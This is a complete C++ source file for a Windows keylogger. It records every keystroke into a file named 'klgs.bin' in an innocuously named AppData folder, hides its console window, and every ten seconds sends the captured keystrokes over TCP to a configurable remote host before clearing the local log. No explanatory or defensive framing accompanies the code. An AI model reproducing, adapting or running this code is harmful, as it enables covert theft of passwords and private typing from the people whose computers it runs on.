#include <iostream>
#include <fstream>
#include <winsock2.h> // For networking (TCP)
#include <windows.h>
#include <string>
#include <cstdlib>
#include <cstring>

// Link with Ws2_32.lib
#pragma comment(lib, "Ws2_32.lib")
using namespace std;

// Function to log keys to a file
void logKey(const string& key, const string& filePath) {
  ofstream logFile(filePath, ios::app);
  if (logFile.is_open()) {
    logFile << key;
    logFile.close();
  } else {
    cerr << "Unable to open log file!" << endl;
  }
}

// Function to check if a directory exists
bool directoryExists(const string& path) {
  DWORD dwAttrib = GetFileAttributesA(path.c_str());
  return (dwAttrib != INVALID_FILE_ATTRIBUTES && (dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
}

// Function to create a directory and its parents
void createDirectory(const string& path) {
  if (!CreateDirectoryA(path.c_str(), NULL)) {
    if (GetLastError() == ERROR_PATH_NOT_FOUND) {
      string parentPath = path.substr(0, path.find_last_of("\\"));
      createDirectory(parentPath); // Recursively create parent directories
      CreateDirectoryA(path.c_str(), NULL);
    }
  }
}

// Function to send the contents of the keylog file to a remote server
void sendLogToServer(const string& filePath, const string& serverIP, int serverPort) {
  // Initialize Winsock
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
    cerr << "WSAStartup failed: " << WSAGetLastError() << endl;
    return;
  }

  // Create a socket
  SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  if (clientSocket == INVALID_SOCKET) {
    cerr << "Socket creation failed: " << WSAGetLastError() << endl;
    WSACleanup();
    return;
  }

  // Configure the server address
  sockaddr_in serverAddr;
  serverAddr.sin_family = AF_INET;
  serverAddr.sin_port = htons(serverPort);
  serverAddr.sin_addr.s_addr = inet_addr(serverIP.c_str());

  // Connect to the server
  if (connect(clientSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
    cerr << "Connection to server failed: " << WSAGetLastError() << endl;
    closesocket(clientSocket);
    WSACleanup();
    return;
  }

  // Read the log file
  ifstream logFile(filePath);
  if (!logFile.is_open()) {
    cerr << "Failed to open log file for reading!" << endl;
    closesocket(clientSocket);
    WSACleanup();
    return;
  }

  string logContents((istreambuf_iterator<char>(logFile)), istreambuf_iterator<char>());
  logFile.close();

  // Send the log contents
  if (send(clientSocket, logContents.c_str(), logContents.size(), 0) == SOCKET_ERROR) {
    cerr << "Failed to send data: " << WSAGetLastError() << endl;
  }

  // Clear the log file after sending
  ofstream clearFile(filePath, ios::trunc);
  if (clearFile.is_open()) {
    clearFile.close();
  }

  // Cleanup
  closesocket(clientSocket);
  WSACleanup();
}

int main(int argc, char* argv[]) {
  int port = 9596;                   // Default port
  string address = "127.0.0.1"; // Default address

  // Parse command-line arguments
  for (int i = 1; i < argc; i++) {
    if (strcmp(argv[i], "-p") == 0 && i + 1 < argc) {
      port = atoi(argv[i + 1]);
      i++; // Skip the next argument
    } else if (strcmp(argv[i], "-a") == 0 && i + 1 < argc) {
      address = argv[i + 1];
      i++; // Skip the next argument
    } else {
      cerr << "Unknown or incomplete parameter: " << argv[i] << endl;
      cout << "Usage: " << argv[0] << " [-p port] [-a address]" << endl;
      return 1;
    }
  }

  // Get the AppData directory using GetEnvironmentVariableA
  char appDataPath[MAX_PATH];
  if (GetEnvironmentVariableA("APPDATA", appDataPath, MAX_PATH)) {
    string directoryPath = string(appDataPath) + "\\OpenDirectoryServices";

    // Ensure the directory exists
    if (!directoryExists(directoryPath)) {
      createDirectory(directoryPath);
    }

    // Define the log file path
    const string logFilePath = directoryPath + "\\klgs.bin";

    // Hide the console window (optional)
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Timer for sending logs
    DWORD lastSendTime = GetTickCount();

    while (true) {
      // Key logging functionality
      for (int key = 8; key <= 255; key++) {
        if (GetAsyncKeyState(key) & 0x8000) {
          switch (key) {
            case VK_BACK:
              logKey("[BACKSPACE]", logFilePath);
              break;
            case VK_RETURN:
              logKey("[ENTER]\n", logFilePath);
              break;
            case VK_SPACE:
              logKey(" ", logFilePath);
              break;
            case VK_TAB:
              logKey("[TAB]", logFilePath);
              break;
            case VK_SHIFT:
              logKey("[SHIFT]", logFilePath);
              break;
            case VK_CONTROL:
              logKey("[CTRL]", logFilePath);
              break;
            case VK_ESCAPE:
              logKey("[ESC]", logFilePath);
              break;
            default:
              if ((key >= 0x30 && key <= 0x5A) ||
                  (key >= 0x60 && key <= 0x69) ||
                  (key >= VK_OEM_1 && key <= VK_OEM_3) ||
                  (key >= VK_OEM_4 && key <= VK_OEM_8)) {
                logKey(string(1, static_cast<char>(key)), logFilePath);
              }
              break;
          }
          Sleep(50);
        }
      }

      // Check if 10 seconds have passed
      if (GetTickCount() - lastSendTime >= 10000) {
        sendLogToServer(logFilePath, address, port); // Send log to server
        lastSendTime = GetTickCount();
      }
    }
  } else {
    cerr << "Failed to retrieve AppData directory!" << endl;
  }

  return 0;
}
